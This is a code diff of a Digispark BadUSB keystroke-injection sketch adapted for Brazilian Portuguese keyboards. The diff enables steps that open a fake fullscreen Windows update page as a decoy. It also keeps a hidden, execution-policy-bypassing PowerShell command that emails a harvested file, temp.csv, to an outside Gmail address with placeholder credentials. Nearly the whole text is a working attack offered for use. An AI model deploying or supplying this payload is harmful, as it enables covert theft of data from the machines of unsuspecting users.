@@ -3,6 +3,12 @@
 //Updated by gadotti:
 //  Uses a pt-bt layout keyboard
 //  Change to search for portuguese brazilian windows terms
+//  replace smtp is smtp.gmail.com 
+//  replace smtp port is 587
+//  replace your-email@gmail.com
+//  replace your-password
+//  replace destination-email@gmail.com
+
 #include "DigiKeyboardPtBr.h"
 void setup() {
 }
@@ -10,14 +16,14 @@ void setup() {
 void loop() {
   digitalWrite(1, HIGH); // LED on <--> Action start
   
-  //DigiKeyboardPtBr.sendKeyStroke(0);
-  //DigiKeyboardPtBr.delay(500);
-  //DigiKeyboardPtBr.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
-  //DigiKeyboardPtBr.delay(500);
-  //DigiKeyboardPtBr.print("http://fakeupdate.net/win10u/index.html");
-  //DigiKeyboardPtBr.sendKeyStroke(KEY_ENTER);
-  //DigiKeyboardPtBr.delay(2000);
-  //DigiKeyboardPtBr.sendKeyStroke(KEY_F11);
+  DigiKeyboardPtBr.sendKeyStroke(0);
+  DigiKeyboardPtBr.delay(500);
+  DigiKeyboardPtBr.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
+  DigiKeyboardPtBr.delay(500);
+  DigiKeyboardPtBr.print("http://fakeupdate.net/win10/index.html");
+  DigiKeyboardPtBr.sendKeyStroke(KEY_ENTER);
+  DigiKeyboardPtBr.delay(2000);
+  DigiKeyboardPtBr.sendKeyStroke(KEY_F11);
   
   DigiKeyboardPtBr.sendKeyStroke(0);
   DigiKeyboardPtBr.delay(500);
@@ -47,7 +53,7 @@ void loop() {
   DigiKeyboardPtBr.print("COLOR EF");
   DigiKeyboardPtBr.sendKeyStroke(KEY_ENTER);
   DigiKeyboardPtBr.delay(100);
-  DigiKeyboardPtBr.print(F("powershell -NoP -NonI -W Hidden -Exec Bypass \"$SMTPInfo = New-Object Net.Mail.SmtpClient('smtp.gmail.com', 587); $SMTPInfo.EnableSsl = $true; $SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('your-email@gmail.com', 'your-password'); $ReportEmail = New-Object System.Net.Mail.MailMessage; $ReportEmail.From = 'your-email-again@gmail.com'; $ReportEmail.To.Add('destination-email@gmail.com'); $ReportEmail.Subject = 'DigiSpark Report'; $ReportEmail.Body = 'Attached is your report. - Regards Your Digispark'; $ReportEmail.Attachments.Add('temp.csv'); $SMTPInfo.Send($ReportEmail)\""));
+  DigiKeyboardPtBr.print(F("powershell -NoP -NonI -W Hidden -Exec Bypass \"$SMTPInfo = New-Object Net.Mail.SmtpClient('smtp.gmail.com', 587); $SMTPInfo.EnableSsl = $true; $SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('your-email@gmail.com', 'your-password'); $ReportEmail = New-Object System.Net.Mail.MailMessage; $ReportEmail.From = 'your-email@gmail.com'; $ReportEmail.To.Add('destination-email@gmail.com'); $ReportEmail.Subject = 'DigiSpark Report'; $ReportEmail.Body = 'Attached is your report. - Regards Your Digispark'; $ReportEmail.Attachments.Add('temp.csv'); $SMTPInfo.Send($ReportEmail)\""));
   DigiKeyboardPtBr.sendKeyStroke(KEY_ENTER);
   DigiKeyboardPtBr.delay(500);
   DigiKeyboardPtBr.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
